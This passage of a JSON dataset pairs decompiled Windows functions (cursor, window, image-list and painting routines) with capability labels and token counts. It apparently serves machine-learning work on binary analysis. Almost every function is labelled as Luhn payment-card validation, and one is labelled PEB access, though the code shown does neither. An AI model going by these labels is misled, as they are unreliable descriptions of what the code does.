            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00443ab8(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.00443ad4();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 51
    },
    "00443ad4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443ad4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x494948)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 135
    },
    "00443b04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443b04(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x494948)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 147
    },
    "004442a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004442a8(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint auStack28 [3];\n    \n    puVar7 = auStack28;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(auStack28);\n            uVar1 = sub.user32.dll_WindowFromPoint(puVar7, auStack28[0]);\n            if (uVar1 != 0) {\n                iVar6 = 0;\n                uVar4 = uVar1;\n                iVar2 = sub.user32.dll_GetWindowThreadProcessId(uVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = sub.user32.dll_SendMessageA(uVar1, 0x84, 0, uVar4 & 0xffff | iVar6 << 0x10);\n                    sub.user32.dll_SendMessageA(uVar1, 0x20, uVar1, uVar4 & 0xffff | 0x2000000);\n                    return;\n                }\n            }\n        }\n        uVar5 = fcn.00444280();\n        sub.user32.dll_SetCursor(uVar5);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 392
    },
    "004444c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004444c8(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        iVar2 = fcn.0043dfbc();\n        uVar1 = fcn.0043dfbc();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x02') {\n        iVar3 = fcn.0043dfbc();\n        iVar2 = *(param_2 + 0x4c);\n        iVar4 = fcn.0043dfbc();\n        uVar1 = iVar4 + *(in_EAX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x03') {\n        iVar2 = fcn.0043df9c();\n        uVar1 = fcn.0043df9c();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x04') {\n        iVar3 = fcn.0043df9c();\n        iVar2 = *(param_2 + 0x48);\n        iVar4 = fcn.0043df9c();\n        uVar1 = iVar4 + *(in_EAX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 396
    },
    "004448b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004448b4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x4448c9;\n    cVar1 = fcn.0044485c(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.00404620();\n        uStack28 = 0x44492e;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.0044470c(&stack0xfffffffc);\n        fcn.0044470c(&stack0xfffffffc);\n        fcn.0044470c(&stack0xfffffffc);\n        fcn.0044470c(&stack0xfffffffc);\n        fcn.0044470c(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x44492d;\n        fcn.00404650();\n        return;\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00445518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00445518(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if ((iVar1 == 0) || (iVar1 == *(*0x499c1c + 0x30))) {\n        var_4h = 0;\n    }\n    else {\n        func_0x00408290(iVar1, &var_4h);\n    }\n    iVar2 = sub.kernel32.dll_GetCurrentProcessId();\n    if (iVar2 == var_4h) {\n        iVar2 = fcn.004198f4();\n        if (iVar2 < 0) {\n            fcn.00419740();\n        }\n    }\n    if ((((iVar1 != 0) && (arg_8h != *(*0x499c1c + 0x30))) && (iVar1 == *(*0x499c1c + 0x30))) && (arg_8h != arg_ch)) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040676c();\n            fcn.00406928(iVar1 + 1);\n            iVar1 = fcn.0040676c();\n            *(*0x499c40 + -4 + iVar1 * 4) = arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 344
    },
    "00445880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445880(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.00445f74();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 133
    },
    "004462f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004462f4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar4 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x10a)) {\n        puStack28 = 0x44631f;\n        iVar2 = sub.user32.dll_GetCapture();\n        if (iVar2 == 0) {\n            iVar2 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar2 != *(*(in_EAX + 0x44) + 0x29c))) {\n                while( true ) {\n                    puStack28 = 0x44634e;\n                    cVar1 = fcn.0044d350();\n                    if ((cVar1 != '\\0') || (iVar2 == 0)) break;\n                    iStack24 = iVar2;\n                    iVar2 = sub.user32.dll_GetParent();\n                }\n                if (iVar2 == 0) {\n                    iVar2 = *param_2;\n                }\n            }\n            else {\n                puStack28 = 0x44633b;\n                iVar2 = fcn.004585f8();\n            }\n            puStack28 = iVar2;\n            iVar3 = sub.user32.dll_IsWindowUnicode();\n            if (iVar3 == 0) {\n                iVar2 = func_0x00408418(iVar2, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n            else {\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageW();\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n        else {\n            puStack28 = &stack0xffffffe8;\n            func_0x00408290(iVar2);\n            uVar5 = *(in_EAX + 0x30);\n            func_0x00408290(uVar5, &stack0xffffffe4);\n            if (iStack24 == iStack20) {\n                puStack28 = param_2[3];\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageA(uVar5, param_2[1] + 0xbc00, param_2[2]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 634
    },
    "00446638": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00446638(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00446524();\n    if (cVar1 == '\\0') {\n        fcn.00446edc();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00446748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00446748(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint8_t uStack520;\n    \n    uVar1 = fcn.00404528();\n    while (uVar2 = uVar1,  uVar1 != 0) {\n        fcn.00404530();\n        fcn.00404530();\n        bVar3 = uStack520 == 0xffffffff;\n        uVar2 = fcn.00403a4c();\n        if (bVar3) break;\n        uVar1 = fcn.004045dc();\n    }\n    return uVar2 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 161
    },
    "00446e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00446e50(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    sub.user32.dll_GetCursorPos(auStack12);\n    iVar1 = fcn.0044ee0c();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        *(in_EAX + 0x48) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "004473f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004473f8(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.004472b0();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.00447744();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.00447430();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00448068": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00448068(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x28) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 236
    },
    "00448648": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00448648(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x448659;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x4486e9;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.0042a5c4();\n    fcn.004299b0();\n    fcn.00424fb8();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.00448648::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.00418448(arg_8h, arg_ch);\n    fcn.004299b0(&fcn.00448648::var_18h);\n    fcn.0042535c();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x4486f0);\n    return;\n}\n",
        "token_count": 389
    },
    "0044870c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044870c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.00448648();\n    return;\n}\n",
        "token_count": 158
    },
    "004488ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004488ac(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x4488c7;\n    fcn.004293dc();\n    uStack36 = 0x44895b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x4488e4;\n    puStack32 = &stack0xfffffffc;\n    fcn.004293dc();\n    uStack48 = 0x44893e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0044863c();\n    uVar1 = fcn.00448780();\n    uVar2 = fcn.00448780(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404650(0x448945);\n    return;\n}\n",
        "token_count": 332
    },
    "004491a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004491a8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != NULL) {\n        puStack32 = 0x4491c0;\n        iVar1 = fcn.00448978();\n        puStack32 = 0x4491c9;\n        iVar2 = fcn.00448978();\n        if (iVar1 == iVar2) {\n            puStack32 = 0x4491dd;\n            iVar1 = fcn.00448978();\n            if (iVar1 != 0) {\ncode_r0x004491f5:\n                puStack32 = 0x449201;\n                fcn.00404620();\n                uStack36 = 0x449284;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x44921c;\n                puStack32 = &fcn.004491a8::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x449228;\n                fcn.00404620();\n                uStack48 = 0x449267;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.004491a8::var_1h + 1;\n                (**(*param_2 + 0x3c))();\n                var_1h._0_1_ = fcn.00449164();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x44926e;\n                uStack48 = 0x449266;\n                uVar3 = fcn.00404650();\n                return uVar3;\n            }\n            puStack32 = 0x4491e8;\n            iVar1 = fcn.00448978();\n            if (iVar1 != 0) goto code_r0x004491f5;\n            var_1h._0_1_ = 1;\n            goto code_r0x0044928b;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0044928b:\n    return var_1h;\n}\n",
        "token_count": 620
    },
    "004492f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004492f4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00420354();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.00449298(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 161
    },
    "004495e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004495e0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x4495ff;\n    iVar1 = fcn.00420ae0(0);\n    uStackY44 = 0x449640;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.00448744();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x449647;\n    iStackY48 = 0x44963f;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 235
    },
    "0044a1b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a1b8(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0044a5f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044a5f8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004208e8();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 197
    },
    "0044d1b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d1b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x492650 + 0x1b4) = arg_8h;\n    iVar1 = sub.user32.dll_IsWindowUnicode(arg_8h);\n    if (iVar1 == 0) {\n        sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x492650 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffffc, *(*0x492650 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x499c72, *0x492650);\n    sub.user32.dll_SetPropA(arg_8h, *0x499c70, *0x492650);\n    iVar1 = *0x492650;\n    *0x492650 = 0;\n    uVar3 = (**(iVar1 + 0x1c0))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 506
    },
    "0044d5ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d5ec(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack16 [8];\n    \n    puVar3 = auStack16;\n    iVar1 = param_2;\n    sub.gdi32.dll_GetWindowOrgEx(param_2, auStack16);\n    iVar2 = param_2;\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1 + *(in_EAX + 0x40), puVar3 + *(in_EAX + 0x44), 0);\n    iVar1 = param_2;\n    fcn.00451b4c(param_2);\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1, iVar2, 0);\n    return;\n}\n",
        "token_count": 198
    },
    "0044d778": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d778(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.00402f00();\n    *puVar2 = param_2;\n    uVar3 = fcn.0044d74c(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.0044d714();\n    if (cVar1 == '\\0') {\n        fcn.00419740();\n    }\n    else {\n        fcn.00419898();\n        uVar3 = fcn.004585f8();\n        uVar3 = fcn.004585f8(uVar3);\n        sub.user32.dll_IsChild(uVar3);\n        fcn.00419914();\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0044daf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044daf8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x40) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0044ee0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0044ee0c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint arg_ch;\n    \n    arg_ch = 0x44ee20;\n    iVar1 = fcn.0044edd8();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_ch = 0;\n        arg_8h = 0;\n        fcn.004503d4();\n        iVar2 = fcn.00455430(arg_8h, arg_ch);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(arg_ch, iVar3);\n}\n",
        "token_count": 169
    },
    "0044eea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044eea0(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 38
    },
    "0044eed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044eed0(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x44eee0;\n    var_8h = fcn.00419c08();\n    uStack28 = 0x44ef80;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x44ef12;\n            var_10h = fcn.00419898();\n            puStack36 = 0x44ef1d;\n            cVar1 = fcn.004255ac();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x44ef59;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.0044f10c();\n                fcn.00404f70();\n                fcn.00404f70();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x44ef87;\n    uStack28 = 0x44ef7f;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 437
    },
    "0044f184": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044f184(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 163
    },
    "0044f7f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044f7f4(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.00404a1c();\n    fcn.0044525c();\n    if ((arg_8h[0x25] == 0) || ((*(arg_8h[0x25] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x6c))();\n    }\n    else {\n        fcn.004202d8();\n        fcn.00451b4c(arg_8h);\n        (**(*arg_8h + 0x6c))();\n        fcn.004501b4();\n        fcn.0040484c();\n        arg_8h[0x25] = 0;\n    }\n    fcn.00404650();\n    arg_8h[0x1b] = 0;\n    fcn.00404650();\n    fcn.00404650();\n    fcn.0040ab08();\n    fcn.00404650();\n    fcn.00420010();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "004501b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
